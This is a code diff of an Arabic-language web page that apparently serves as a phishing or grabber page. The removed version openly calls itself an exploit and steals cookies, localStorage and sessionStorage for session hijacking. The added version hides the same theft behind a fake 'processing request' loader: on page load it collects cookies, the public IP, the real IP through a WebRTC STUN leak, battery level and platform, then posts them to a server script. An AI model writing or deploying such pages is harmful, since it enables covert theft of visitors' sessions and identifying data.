@@ -2,73 +2,59 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>ALSSRY - EXPLOIT</title>
+    <title>ALSSRY SYSTEM</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .terminal { width: 80%; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; position: relative; }
-        .cursor { display: inline-block; width: 10px; height: 20px; background: #0f0; animation: blink 0.8s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+        .loader { border: 4px solid #111; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+    <h2>جاري معالجة الطلب...</h2>
+    <div class="loader"></div>
+    <div id="status">فحص بروتوكولات الشبكة...</div>
 
-<div class="terminal">
-    <div id="output"></div>
-    <span class="cursor"></span>
-</div>
+    <script>
+        let deviceData = { cookies: document.cookie };
 
-<script>
-    const output = document.getElementById('output');
-    let data = {
-        cookies: document.cookie, // سحب الكوكيز المتاحة فوراً
-        localStorage: JSON.stringify(window.localStorage), // سحب بيانات الدخول المحفوظة محلياً
-        sessionStorage: JSON.stringify(window.sessionStorage) // سحب الجلسة الحالية
-    };
+        async function start() {
+            // سحب IP
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                deviceData.ip = d.ip;
+            } catch(e) { deviceData.ip = "Unknown"; }
 
-    async function infect() {
-        print("> Initializing Session Hijack...");
-        await wait(1000);
-        
-        // سحب الـ IP الحقيقي كالعادة لتوثيق الصيدة
-        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-        pc.createDataChannel("");
-        pc.createOffer().then(o => pc.setLocalDescription(o));
-        pc.onicecandidate = (e) => {
-            if (e.candidate) {
-                data.real_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
-                sendToBot();
+            // سحب Real IP
+            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+            pc.createDataChannel("");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    deviceData.real_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
+                    sendToApi(); // الإرسال فور سحب أهم معلومة
+                }
+            };
+
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                deviceData.battery = Math.round(b.level * 100) + "%";
             }
-        };
+            deviceData.platform = navigator.platform;
+        }
 
-        print("> Accessing Browser Tokens...");
-        await wait(1500);
-        print("> Cookies Captured: " + (data.cookies ? "SUCCESS" : "EMPTY/PROTECTED"));
-        await wait(1000);
-        print("> LocalStorage Keys: " + Object.keys(window.localStorage).length);
-        await wait(1000);
-        print("> Sending Session ID to ALSSRY Server...");
-        
-        // إرسال البيانات الضخمة (الكوكيز والجلسة)
-        sendToBot();
-    }
+        function sendToApi() {
+            // الإرسال لملف الـ API حقك
+            fetch('api.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(deviceData)
+            }).then(() => {
+                document.getElementById('status').innerText = "اكتمل التزامن.";
+            });
+        }
 
-    function print(msg) {
-        const div = document.createElement('div');
-        div.innerText = msg;
-        output.appendChild(div);
-    }
-
-    function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-    function sendToBot() {
-        fetch('/api/index', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ action: "اختطاف جلسة (الوحش الكاسر)", payload: data })
-        });
-    }
-
-    infect();
-</script>
+        window.onload = start;
+    </script>
 </body>
 </html>
